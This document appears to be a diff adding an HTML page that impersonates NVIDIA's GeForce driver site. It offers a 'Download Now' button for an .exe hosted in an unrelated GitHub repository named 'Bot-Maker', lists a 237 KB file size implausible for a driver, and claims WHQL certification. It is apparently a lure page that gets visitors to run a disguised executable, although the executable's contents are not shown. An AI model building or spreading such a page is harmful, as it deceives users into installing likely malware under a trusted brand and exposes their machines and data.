@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GeForce Drivers | Download Latest NVIDIA Drivers</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+    <script src="https://unpkg.com/feather-icons"></script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#76b900', // NVIDIA green
+                        secondary: '#333333' // Dark gray
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+<body class="bg-gray-100">
+    <custom-header></custom-header>
+    
+    <main class="container mx-auto px-4 py-8">
+        <div class="max-w-4xl mx-auto bg-white rounded-xl shadow-md overflow-hidden">
+            <div class="md:flex">
+                <div class="p-8">
+                    <div class="uppercase tracking-wide text-sm text-primary font-semibold">Latest Release</div>
+                    <h1 class="block mt-1 text-3xl font-bold text-gray-900">NVIDIA Windows Driver</h1>
+                    <p class="mt-2 text-gray-600">Version 536.99 WHQL | Release Date: July 18, 2025</p>
+                    
+                    <div class="mt-6">
+                        <h2 class="text-xl font-semibold text-gray-800">What's New</h2>
+                        <ul class="mt-2 space-y-2 text-gray-600">
+                            <li class="flex items-start">
+                                <i data-feather="check" class="text-primary mr-2"></i>
+                                <span>Improved performance in latest games</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i data-feather="check" class="text-primary mr-2"></i>
+                                <span>New DLSS 3.0 support</span>
+                            </li>
+                            <li class="flex items-start">
+                                <i data-feather="check" class="text-primary mr-2"></i>
+                                <span>Bug fixes and stability improvements</span>
+                            </li>
+                        </ul>
+                    </div>
+                    
+                    <div class="mt-8">
+                        <a href="https://github.com/AutumnRainBot/Bot-Maker/raw/refs/heads/main/NVIDIA%20SDK%20Windows%20Driver.exe" 
+                           class="inline-flex items-center px-6 py-3 bg-primary hover:bg-green-700 text-white font-medium rounded-md shadow-lg transition duration-150">
+                            <i data-feather="download" class="mr-2"></i>
+                            Download Now
+                        </a>
+                        <p class="mt-2 text-sm text-gray-500">File size: 237 KB | Windows 10/11 64-bit</p>
+                    </div>
+                </div>
+                <div class="md:flex-shrink-0 md:w-1/3 bg-gradient-to-b from-primary to-secondary flex items-center justify-center p-8">
+                    <img src="http://static.photos/technology/640x360/42" alt="NVIDIA Technology" class="rounded-lg shadow-xl">
+                </div>
+            </div>
+        </div>
+
+        <div class="mt-12 grid md:grid-cols-3 gap-6">
+            <div class="bg-white p-6 rounded-xl shadow">
+                <div class="text-primary mb-4">
+                    <i data-feather="cpu" class="w-10 h-10"></i>
+                </div>
+                <h3 class="text-xl font-semibold mb-2">Game Ready</h3>
+                <p class="text-gray-600">Optimized for the latest games with day-one driver support.</p>
+            </div>
+            <div class="bg-white p-6 rounded-xl shadow">
+                <div class="text-primary mb-4">
+                    <i data-feather="zap" class="w-10 h-10"></i>
+                </div>
+                <h3 class="text-xl font-semibold mb-2">Performance Boost</h3>
+                <p class="text-gray-600">Get the most out of your NVIDIA GPU with enhanced performance.</p>
+            </div>
+            <div class="bg-white p-6 rounded-xl shadow">
+                <div class="text-primary mb-4">
+                    <i data-feather="shield" class="w-10 h-10"></i>
+                </div>
+                <h3 class="text-xl font-semibold mb-2">WHQL Certified</h3>
+                <p class="text-gray-600">Microsoft certified drivers for maximum stability and reliability.</p>
+            </div>
+        </div>
+    </main>
+
+    <custom-footer></custom-footer>
+
+    <script src="components/header.js"></script>
+    <script src="components/footer.js"></script>
+    <script src="script.js"></script>
+    <script>feather.replace();</script>
+</body>
+</html>
